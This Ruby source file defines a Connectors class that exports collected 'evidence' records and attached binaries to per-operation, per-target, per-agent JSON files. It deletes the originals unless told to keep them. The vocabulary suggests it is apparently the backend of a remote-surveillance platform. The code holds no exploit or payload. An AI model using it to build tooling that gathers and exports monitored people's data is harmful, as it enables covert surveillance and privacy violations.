require 'rcs-common/trace'
require 'pp'
require_relative 'db_objects/queue'

module RCS
module DB

class Connectors
  extend RCS::Tracer

  class << self
    # If the evidence match a connector, adds that evidence and that
    # collector to the CollectorQueue.
    # @retuns False if evidence match at least one connector with keep = false,
    # otherwise true.
    def add_to_queue(evidence)
      keep = true

      ::Connector.matching(evidence).each do |connector|
        ConnectorQueue.add(evidence, connector)
        keep = false unless connector.keep
      end

      keep
    end

    # Dump the given evidence to a file following the rules specified
    # in the connector.
    def dump(evidence, connector)
      # the generator of the evidence
      agent = ::Item.find(evidence.aid)
      operation = ::Item.find(agent.path.first)
      target = ::Item.find(agent.path.last)

      # make a deep copy to prepare it for export
      # TODO: are .dup() really needed?
      exported = evidence.as_document.dup
      exported['data'] = evidence['data'].dup

      # don't export uninteresting fields
      ['blo', 'note', 'kw'].each {|name| exported.delete(name) }

      # insert operation and target references
      exported['oid'] = operation.id.to_s
      exported['tid'] = target.id.to_s

      exported['operation'] = operation.name
      exported['target'] = target.name
      exported['agent'] = agent.name

      if exported['data'][:_grid]
        exported['data'].delete(:_grid)
        exported['data'][:_bin_size] = exported['data'].delete(:_grid_size)
      end

      # TODO: support XML conversion
      # convert it to json
      exported = exported.to_json

      # the full exporting path will be splitted in subdir (one for each item)
      sub_folder =  "#{operation.name}-#{operation.id}"
      sub_folder << "#{target.name}-#{target.id}"
      sub_folder << "#{agent.name}-#{agent.id}"
      path = File.join(connector.dest, sub_folder)

      # ensure the dest folder is created
      FileUtils.mkdir_p(path)

      # dump the evidence
      File.open(File.join(path, "#{evidence.id}.json"), 'wb') { |d| d.write(exported) }

      # dump the binary (if any)
      if evidence[:data][:_grid]
        file = GridFS.get(evidence[:data][:_grid], target.id.to_s)
        File.open(File.join(path, "#{evidence.id}.bin"), 'wb') { |d| d.write(file.read) }
      end

      evidence.destroy unless connector.keep
    end
  end
end

end # ::DB
end # ::RCS
